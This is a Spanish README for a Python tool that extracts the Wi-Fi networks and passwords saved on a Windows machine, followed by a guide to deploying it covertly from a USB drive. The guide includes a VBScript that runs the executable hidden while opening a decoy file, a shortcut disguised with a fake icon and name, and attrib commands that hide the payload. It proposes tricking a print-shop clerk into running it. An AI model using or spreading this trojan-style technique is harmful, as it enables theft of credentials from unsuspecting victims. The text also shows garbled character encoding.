#  PassWIFIPy 馃捇馃攼馃摗

## 驴Qu茅 es PassWIFIPy?  
PassWIFIPy es un script que captura todas las redes WIFI guardadas en el equipo.  
Hace un mapeo de estas redes para al final guardarlas en una carpeta con el  
hostname que tenga asignada la maquina.  

## **Atenci贸n**   鈿狅笍
El script y la explicaci贸n de c贸mo funciona es 煤nicamente con prop贸sitos de aprendizaje,  
no me hago responsable de los malos usos que puedan hacerse con esta herramienta.  

Tambi茅n es importante que sepas que fue desarrollado en un ambiente windows,  
por lo que no es compatible con otros sistemas operativos.  

## Inicio  
```bash
    $ pip install -r requirements.txt
    $ python index.py
```  

## Detalles a tener en cuenta 
- Se creo con la versi贸n 3.10 de Python.  
- Se uso conda para no tener problemas con las versiones instaladas de Python   
    y su paquete pyinstaller.  

## Construyendo ejecutable  
```bash
    $ pyinstaller --onefile index.py
```   

## 驴C贸mo usarlo? 馃 

### Forma facil 馃槉: 
Teniendo el ejecutable puedes hacer la prueba en tu maquina o en la de alguien m谩s con su permiso.  
Tan solo da doble click y este va empezar a escanear las redes wifi y guardarlas en la carpeta wifi-pwd.  

### Forma avanzada 馃洜锔忦煉?:
Una vez teniendo el EXE, puedes crear un archivo autorun.inf y asignarle el   
ejecutable para que inicie autom谩ticamente con la unidad USB.  

Claro esto solo va funcionar si tiene habilitado el modo de autorun en el
equipo.   

Si no es as铆 podr铆as hacer lo siguiente:   

## **index.vbs**  
```vbscript
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run chr(34) & "index.exe" & Chr(34), 0
    WshShell.Run chr(34) & "DISCLETTER:\ROOT\FILE.EXTENSION" & Chr(34), 0
    Set WshShell = Nothing 
```   
Con este script podr谩s iniciar el ejecutable sin mostrar la ventana de la consola,  
solo tienes que copiar el nombre del archivo exe y este se encargar谩 de iniciarlo.  

Puedes definir una segunda ruta con el archivo que quieres que se ejecute despu茅s.  

**驴Para qu茅?**    

Bueno veamos un posible caso, podr铆as estar en un chat o papeler铆a y pedirle  
al encargado que te imprima un archivo de word, una foto, una nota, etc.  
Cualquier tipo de archivo siempre y cuando se pueda abrir en su equipo.  

Gui谩ndonos por este caso podemos ya tener un archivo preparado, como un pdf,  
un word, una foto, etc.  

Entonces aqu铆 es donde entra en juego nuestra segunda l铆nea de comando en  
el archivo index.vbs.  

```vbscript
    WshShell.Run chr(34) & "DISCLETTER:\ROOT\FILE.EXTENSION" & Chr(34), 0
```  
Dentro de las comillas estar谩 la ruta del archivo que quieres abrir.  

Seguido de esto procedemos a crear el acceso directo de nuestro script de vbs.  

![](./img/createldk.png)  

**Cambiar el icono y nombre de tu acceso directo**  

En este paso seg煤n sea el tipo de archivo que quieras abrir, si as铆 lo prefieres, tendr谩s que cambiar  
el icono para que tenga relaci贸n con lo que creaste.   
Esto lo vas a hacer accediendo a la ruta del ejecutable para tomar su icono y   
entre los que est茅n disponibles escoger el que m谩s se parezca.  

![](./img/changeIcon.png)  
![](./img/chicon.png)  

Aseg煤rate de darle el mismo nombre que el verdadero archivo que vas a ejecutar, (este no debe tener acentos)  
para que se ejecute correctamente. Al terminar mu茅velo a la ruta inicial de tu usb, si gustas puedes dejarlo  
dentro de otras carpetas, el acceso directo que se acaba de crear ya tendr谩 esta misma ruta donde se encuentra, 
el script de vbs junto con el exe.  


![](./img/fldk.png)  

**Recuerda**  

El archivo que creaste debe estar en este pedazo de c贸digo, dentro de las comillas.


```vbscript
    WshShell.Run chr(34) & "DISCLETTER:\ROOT\FILE.EXTENSION" & Chr(34), 0
```  
Si ya lo tienes todo preperado, abre una terminal dentro de la unidad USB  
y ejecuta los siguientes comandos:

```bash
    $ attrib +h +s tuarchivo.extension (el archivo que creaste) 
    $ attrib +h +s tuCarpeta/archivosWifi.txt (carpeta que contendr谩 los archivos de las redes WIFI encontradas y los ejeutables) 
```  

![](./img/alonefile.png)  

Esto va ocultar los archivos que seleccionaste, para que de este modo no puedan ser vistos o encontrados.  
Ac谩 puedes tener el acceso directo desde el inicio o desde la carpeta que quieras.  Realmente no importa, ya    
que tiene la ruta donde est谩 el verdadero ejecutable de todo.  

Si lo hiciste bien, al dar doble click en el acceso directo se ejecutar谩 el exe y empezar谩 a capturar las redes WIFI  
que hay en el equipo, y se abrir谩 tu archivo mientras este proceso sigue, guardando as铆 cada red que encuentre  
en una carpeta con el hostname de la maquina y los txt de las redes.

---  

## Ver las redes ya capturadas  

```bash
    $ attrib -h -s tuCarpeta/archivosWifi.txt (carpeta que contendr谩 los archivos de las redes WIFI encontradas y los ejecutables) 
```  

Como resultado de esto tendr谩s de nuevo lo que ocultaste y dentro de esto la carpeta wifi-pwd la cual contendr谩 las carpetas   
de las maquinas con las redes WIFI encontradas.

![](./img/wifi_pwd.png)  
![](./img/hostnamefolder.png)  
![](./img/txtwifi.png)  
